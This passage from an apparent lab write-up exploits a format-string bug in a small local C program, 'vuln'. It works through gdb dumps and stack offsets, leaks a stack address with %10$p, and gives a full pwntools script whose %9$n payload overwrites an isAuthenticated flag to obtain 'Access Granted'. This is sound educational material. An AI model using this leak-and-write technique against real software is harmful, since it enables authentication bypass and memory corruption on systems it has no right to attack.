│ rbp-0x20│ Padding (4 bytes, alignment)   │
└──────────────────────────────────────────┘
Lower addresses
```

So the address of `isAuthenticated` can be obtained by address of `username - 0x4`. We can leak the address of `username` first by printing the first argument to `printf` that is present in `rdi`. 

Unfortunately this idea of leaking `username` doesn't work. 

```bash
Breakpoint 2, 0x000055555555528f in AuthenticateUser () at main2.c:28
28	   	printf(username);
(gdb) info registers rdi rsi rdx rcx r8 r9
rdi            0x7fffffffde98      140737488346776
rsi            0x746f207265746e45  8389960306515013189
rdx            0x0                 0
rcx            0x0                 0
r8             0xa                 10
r9             0xffffffff          4294967295
(gdb) p &username
$1 = (char (*)[8]) 0x7fffffffde98
(gdb)
$2 = (char (*)[8]) 0x7fffffffde98
```

Because although `&username` is present in `rdi`, `printf`'s va_list starts from `rsi`. Still `rsi` should've contained `&username` because previously `scanf` had written to it

```bash
Dump of assembler code for function AuthenticateUser:
   0x000055555555521e <+0>:	endbr64
   0x0000555555555222 <+4>:	push   rbp
   0x0000555555555223 <+5>:	mov    rbp,rsp
   0x0000555555555226 <+8>:	sub    rsp,0x20
=> 0x000055555555522a <+12>:	mov    rax,QWORD PTR fs:0x28
   0x0000555555555233 <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555237 <+25>:	xor    eax,eax
   0x0000555555555239 <+27>:	mov    DWORD PTR [rbp-0x1c],0x0
   0x0000555555555240 <+34>:	lea    rax,[rip+0xdd5]        # 0x55555555601c
   0x0000555555555247 <+41>:	mov    rdi,rax
   0x000055555555524a <+44>:	mov    eax,0x0
   0x000055555555524f <+49>:	call   0x5555555550b0 <printf@plt>
   0x0000555555555254 <+54>:	lea    rax,[rbp-0x18]
   0x0000555555555258 <+58>:	mov    rsi,rax
   0x000055555555525b <+61>:	lea    rax,[rip+0xdcb]        # 0x55555555602d
   0x0000555555555262 <+68>:	mov    rdi,rax
   0x0000555555555265 <+71>:	mov    eax,0x0
   0x000055555555526a <+76>:	call   0x5555555550d0 <__isoc99_scanf@plt>
   0x000055555555526f <+81>:	lea    rax,[rip+0xdba]        # 0x555555556030
   0x0000555555555276 <+88>:	mov    rdi,rax
   0x0000555555555279 <+91>:	mov    eax,0x0
   0x000055555555527e <+96>:	call   0x5555555550b0 <printf@plt>
   0x0000555555555283 <+101>:	lea    rax,[rbp-0x18]
   0x0000555555555287 <+105>:	mov    rdi,rax
   0x000055555555528a <+108>:	mov    eax,0x0
   0x000055555555528f <+113>:	call   0x5555555550b0 <printf@plt>
   0x0000555555555294 <+118>:	lea    rax,[rbp-0x10]
   0x0000555555555298 <+122>:	mov    rsi,rax
   0x000055555555529b <+125>:	lea    rax,[rip+0xd8b]        # 0x55555555602d
```

But somewhere in between it was modified by libc, since its not callee restored, we lost that value, but anyway this approach was not reliable. 

#### Alternate way of leaking a stack address

Our goal is not to leak the exact address of `isAuthenticated`, we need to leak any stack address. Since the stack layout is predictable, we can derive all other addresses using the found address. Since our previous attempt of leaking `username` failed, the only other stack address lying on stack itself is **saved rbp** of main. 

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x0000555555555321 <+0>:	endbr64
   0x0000555555555325 <+4>:	push   rbp
   0x0000555555555326 <+5>:	mov    rbp,rsp
   0x0000555555555329 <+8>:	mov    eax,0x0
   0x000055555555532e <+13>:	call   0x55555555521e <AuthenticateUser>
   0x0000555555555333 <+18>:	mov    eax,0x0
   0x0000555555555338 <+23>:	pop    rbp
   0x0000555555555339 <+24>:	ret
End of assembler dump.
```

There is no space allocate for main's stack frame. This is it.

```bash
Higher addresses
┌──────────────────────────┐
│ return address to _start │  ← [rbp+8]
├──────────────────────────┤
│ saved rbp (from _start)  │  ← [rbp]
└──────────────────────────┘
Lower addresses
```

So `isAuthenticated` is at `main's rbp - 0x2C`  (44 bytes).

Since saved RBP is 32 bytes below `rsp`, we need to leak the 4th argument on stack, i.e., 6 (registers) + 4 = 10th argument.

```bash
$ ./vuln
Enter Username: %10$p
Enter otp for: 0x7fff0093a0e0
```

So address of `isAuthenticated` is `0x7fff0093a0e0 - 0x2C = 0x7fff0093a0b4`

#### Overwriting the `isAuthenticated`

If we attempt to build the payload like `[ address of isAuthenticated (8 bytes) ][ %8$n ]`

We will end up overwriting the stack canary since the buffer is more than 8 bytes and the `otp` variable is right next to the canary. But the even bigger problem is userspace addresses look like this in linux `0x00007fffffffdec0`

```
0x00007fffffffdec0
  ^^^^
  These are ALWAYS null bytes!
```

This is because:

- x64 uses 64-bit addresses (8 bytes)
- But only 48 bits are actually used for virtual addresses
- The upper 16 bits are always zero (canonical addressing)

When we write it into memory in little endian it will look like this

```
0x7fffffffdea0:	0x94	0xde	0xff	0xff	0xff	0x7f	0x00	0x00
```

The issue here is `printf` stops processing at null bytes and never reaches the format arguments. 

To overcome this, we need to build payload in this format

```
[padding/format_string] [address_at_the_end]
```

Now the actual otp string moved by 8 bytes, we change 8 to 9. Payload will look like `'%9$nXXXX' + '0x7fffffffde94'`

And since the value of `isAuthenticated` need to be exactly `1`, we will change the argument to `h%9$nXXX`, now it will print one character `h` and sees `%9$n`, then it moves the `arg_ptr` to where `otp` string is present, but its value is the address of `isAuthenticated`. So it will dereference that address and ends up wriiting 1 there. 

pwntools script for same

```python
#!/usr/bin/env python3
from pwn import *
import re

context.binary = "./vuln"
context.log_level = "debug"

def main():
    print("[*] Launching process")
    p = process("./vuln", stdin=PTY, stdout=PTY)

    # -------------------------
    # Stage 1: Leak main RBP
    # -------------------------
    print("[*] Waiting for Username prompt")
    p.recvuntil(b"Enter Username: ")

    print("[*] Sending format string leak")
    p.sendline(b"%10$p")

    print("[*] Reading leak output")
    data = p.recvuntil(b"Enter otp for: ", timeout=2)
    data += p.recv(timeout=0.2)   # <-- CRITICAL: drain inline leak

    print(f"[DEBUG] Full leak buffer:\n{data}")

    leaks = re.findall(rb"0x[0-9a-fA-F]+", data)
    if not leaks:
        log.failure("Failed to extract leaked RBP")
        p.close()
        return

    main_rbp = int(leaks[0], 16)
    log.success(f"Leaked main RBP: {hex(main_rbp)}")

    # -------------------------
    # Stage 2: Calculate target
    # -------------------------
    is_auth = main_rbp - 0x2c
    log.success(f"isAuthenticated @ {hex(is_auth)}")

    # -------------------------
    # Stage 3: %n payload
    # -------------------------
    payload  = b"h"          # prints 1 byte
    payload += b"%9$n"       # writes 1 to *(arg9)
    payload += b"XXX"
    payload += p64(is_auth)
    payload += b"\n"

    print(f"[DEBUG] Payload bytes: {payload}")

    # -------------------------
    # Stage 4: Trigger write
    # -------------------------
    print("[*] Sending OTP payload")
    p.send(payload)

    # -------------------------
    # Stage 5: Read result
    # -------------------------
    out = p.recvall(timeout=1)
    print("[*] Program output:")
    print(out.decode(errors="ignore"))

    if b"Access Granted" in out:
        print("[+] SUCCESS")
    else:
        print("[-] FAILURE")

    p.close()

if __name__ == "__main__":
    main()
```

```bash
[*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Launching process
[+] Starting local process './vuln' argv=[b'./vuln'] : pid 9369
[*] Waiting for Username prompt
[DEBUG] Received 0x10 bytes:
    b'Enter Username: '
[*] Sending format string leak
[DEBUG] Sent 0x6 bytes:
    b'%10$p\n'
[*] Reading leak output
[DEBUG] Received 0x1d bytes:
    b'Enter otp for: 0x7ffc5e8deac0'
[DEBUG] Full leak buffer:
b'Enter otp for: 0x7ffc5e8deac0'
[+] Leaked main RBP: 0x7ffc5e8deac0
[+] isAuthenticated @ 0x7ffc5e8dea94
[DEBUG] Payload bytes: b'h%9$nXXX\x94\xea\x8d^\xfc\x7f\x00\x00\n'
[*] Sending OTP payload
[DEBUG] Sent 0x11 bytes:
    00000000  68 25 39 24  6e 58 58 58  94 ea 8d 5e  fc 7f 00 00  │h%9$│nXXX│···^│····│
    00000010  0a                                                  │·│
    00000011
[+] Receiving all data: Done (86B)
[DEBUG] Received 0x56 bytes:
    00000000  59 6f 75 20  65 6e 74 65  72 65 64 20  6f 74 70 3a  │You │ente│red │otp:│
    00000010  20 68 58 58  58 94 ea 8d  5e fc 7f 41  63 63 65 73  │ hXX│X···│^··A│cces│
    00000020  73 20 47 72  61 6e 74 65  64 0a 2a 2a  2a 20 73 74  │s Gr│ante│d·**│* st│
    00000030  61 63 6b 20  73 6d 61 73  68 69 6e 67  20 64 65 74  │ack │smas│hing│ det│
    00000040  65 63 74 65  64 20 2a 2a  2a 3a 20 74  65 72 6d 69  │ecte│d **│*: t│ermi│
    00000050  6e 61 74 65  64 0a                                  │nate│d·│
    00000056
[*] Stopped process './vuln' (pid 9369)
[*] Program output:
You entered otp: hXXX^\x7fAccess Granted
*** stack smashing detected ***: terminated

[+] SUCCESS
```